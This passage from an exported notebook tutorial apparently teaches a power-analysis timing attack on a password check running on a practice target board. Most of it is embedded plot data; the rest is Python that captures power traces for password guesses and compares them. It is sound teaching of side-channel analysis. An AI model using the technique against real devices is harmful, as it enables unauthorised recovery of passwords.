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","dtype":"float64","shape":[2000]}},"selected":{"id":"1045","type":"Selection"},"selection_policy":{"id":"1046","type":"UnionRenderers"}},"id":"1034","type":"ColumnDataSource"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{},"id":"1007","type":"LinearScale"}],"root_ids":["1002"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"c11b3e78-69c9-4c3f-98ac-5988346f6820","roots":{"1002":"341f6aab-a2e3-499f-b163-eb9798508376"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

Timing Analysis
---------------

Now that we can capture traces, we can begin planning our attack. First
we'll make a function to guess a password and return a power trace,
since we'll be repeating those steps a lot:


**In [13]:**

.. code:: ipython3

    def cap_pass_trace(pass_guess):
        ret = ""
        reset_target(scope)
        num_char = target.in_waiting()
        while num_char > 0:
            ret += target.read(num_char, 10)
            time.sleep(0.01)
            num_char = target.in_waiting()
    
        scope.arm()
        target.write(pass_guess)
        ret = scope.capture()
        if ret:
            print('Timeout happened during acquisition')
    
        trace = scope.get_last_trace()
        return trace

Next, we'll try two different passwords and see if the power traces
differ by length. We'll then plot both traces on the same figure (with
the first in red and the second in blue).


**In [14]:**

.. code:: ipython3

    trace = cap_pass_trace("\n")
    new_trace = cap_pass_trace("h\n")
    x_range = range(0, len(new_trace))
    p = figure()
    p.add_tools(CrosshairTool())
    p.line(x_range, new_trace)
    p.line(x_range, trace, line_color='red')
    show(p)


**Out [14]:**


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="f0ea7b62-80df-4384-898c-7a444b60ce29" data-root-id="1102"></div>
    
    </div>



.. raw:: html

    

    <div id="90db483c-bf21-47d4-b39e-9eee5763fd1f"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#90db483c-bf21-47d4-b39e-9eee5763fd1f');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"a34389af-bc31-419c-8673-2310d656ca15":{"roots":{"references":[{"attributes":{"below":[{"id":"1111","type":"LinearAxis"}],"center":[{"id":"1115","type":"Grid"},{"id":"1120","type":"Grid"}],"left":[{"id":"1116","type":"LinearAxis"}],"renderers":[{"id":"1139","type":"GlyphRenderer"},{"id":"1144","type":"GlyphRenderer"}],"title":{"id":"1155","type":"Title"},"toolbar":{"id":"1127","type":"Toolbar"},"x_range":{"id":"1103","type":"DataRange1d"},"x_scale":{"id":"1107","type":"LinearScale"},"y_range":{"id":"1105","type":"DataRange1d"},"y_scale":{"id":"1109","type":"LinearScale"}},"id":"1102","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1117","type":"BasicTicker"},{"attributes":{},"id":"1161","type":"Selection"},{"attributes":{},"id":"1109","type":"LinearScale"},{"attributes":{},"id":"1107","type":"LinearScale"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1165","type":"BoxAnnotation"},{"attributes":{},"id":"1164","type":"UnionRenderers"},{"attributes":{"formatter":{"id":"1157","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{},"id":"1163","type":"Selection"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{},"id":"1162","type":"UnionRenderers"},{"attributes":{},"id":"1157","type":"BasicTickFormatter"},{"attributes":{},"id":"1159","type":"BasicTickFormatter"},{"attributes":{"line_color":"red","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1137","type":"Line"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"},{"attributes":{"formatter":{"id":"1159","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{"source":{"id":"1136","type":"ColumnDataSource"}},"id":"1140","type":"CDSView"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1241,1242,1243,1244,1245,1246,1247,1248,1249,1250,1251,1252,1253,1254,1255,1256,1257,1258,1259,1260,1261,1262,1263,1264,1265,1266,1267,1268,1269,1270,1271,1272,1273,1274,1275,1276,1277,1278,1279,1280,1281,1282,1283,1284,1285,1286,1287,1288,1289,1290,1291,1292,1293,1294,1295,1296,1297,1298,1299,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1312,1313,1314,1315,1316,1317,1318,1319,1320,1321,1322,1323,1324,1325,1326,1327,1328,1329,1330,1331,1332,1333,1334,1335,1336,1337,1338,1339,1340,1341,1342,1343,1344,1345,1346,1347,1348,1349,1350,1351,1352,1353,1354,1355,1356,1357,1358,1359,1360,1361,1362,1363,1364,1365,1366,1367,1368,1369,1370,1371,1372,1373,1374,1375,1376,1377,1378,1379,1380,1381,1382,1383,1384,1385,1386,1387,1388,1389,1390,1391,1392,1393,1394,1395,1396,1397,1398,1399,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1412,1413,1414,1415,1416,1417,1418,1419,1420,1421,1422,1423,1424,1425,1426,1427,1428,1429,1430,1431,1432,1433,1434,1435,1436,1437,1438,1439,1440,1441,1442,1443,1444,1445,1446,1447,1448,1449,1450,1451,1452,1453,1454,1455,1456,1457,1458,1459,1460,1461,1462,1463,1464,1465,1466,1467,1468,1469,1470,1471,1472,1473,1474,1475,1476,1477,1478,1479,1480,1481,1482,1483,1484,1485,1486,1487,1488,1489,1490,1491,1492,1493,1494,1495,1496,1497,1498,1499,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1510,1511,1512,1513,1514,1515,1516,1517,1518,1519,1520,1521,1522,1523,1524,1525,1526,1527,1528,1529,1530,1531,1532,1533,1534,1535,1536,1537,1538,1539,1540,1541,1542,1543,1544,1545,1546,1547,1548,1549,1550,1551,1552,1553,1554,1555,1556,1557,1558,1559,1560,1561,1562,1563,1564,1565,1566,1567,1568,1569,1570,1571,1572,1573,1574,1575,1576,1577,1578,1579,1580,1581,1582,1583,1584,1585,1586,1587,1588,1589,1590,1591,1592,1593,1594,1595,1596,1597,1598,1599,1600,1601,1602,1603,1604,1605,1606,1607,1608,1609,1610,1611,1612,1613,1614,1615,1616,1617,1618,1619,1620,1621,1622,1623,1624,1625,1626,1627,1628,1629,1630,1631,1632,1633,1634,1635,1636,1637,1638,1639,1640,1641,1642,1643,1644,1645,1646,1647,1648,1649,1650,1651,1652,1653,1654,1655,1656,1657,1658,1659,1660,1661,1662,1663,1664,1665,1666,1667,1668,1669,1670,1671,1672,1673,1674,1675,1676,1677,1678,1679,1680,1681,1682,1683,1684,1685,1686,1687,1688,1689,1690,1691,1692,1693,1694,1695,1696,1697,1698,1699,1700,1701,1702,1703,1704,1705,1706,1707,1708,1709,1710,1711,1712,1713,1714,1715,1716,1717,1718,1719,1720,1721,1722,1723,1724,1725,1726,1727,1728,1729,1730,1731,1732,1733,1734,1735,1736,1737,1738,1739,1740,1741,1742,1743,1744,1745,1746,1747,1748,1749,1750,1751,1752,1753,1754,1755,1756,1757,1758,1759,1760,1761,1762,1763,1764,1765,1766,1767,1768,1769,1770,1771,1772,1773,1774,1775,1776,1777,1778,1779,1780,1781,1782,1783,1784,1785,1786,1787,1788,1789,1790,1791,1792,1793,1794,1795,1796,1797,1798,1799,1800,1801,1802,1803,1804,1805,1806,1807,1808,1809,1810,1811,1812,1813,1814,1815,1816,1817,1818,1819,1820,1821,1822,1823,1824,1825,1826,1827,1828,1829,1830,1831,1832,1833,1834,1835,1836,1837,1838,1839,1840,1841,1842,1843,1844,1845,1846,1847,1848,1849,1850,1851,1852,1853,1854,1855,1856,1857,1858,1859,1860,1861,1862,1863,1864,1865,1866,1867,1868,1869,1870,1871,1872,1873,1874,1875,1876,1877,1878,1879,1880,1881,1882,1883,1884,1885,1886,1887,1888,1889,1890,1891,1892,1893,1894,1895,1896,1897,1898,1899,1900,1901,1902,1903,1904,1905,1906,1907,1908,1909,1910,1911,1912,1913,1914,1915,1916,1917,1918,1919,1920,1921,1922,1923,1924,1925,1926,1927,1928,1929,1930,1931,1932,1933,1934,1935,1936,1937,1938,1939,1940,1941,1942,1943,1944,1945,1946,1947,1948,1949,1950,1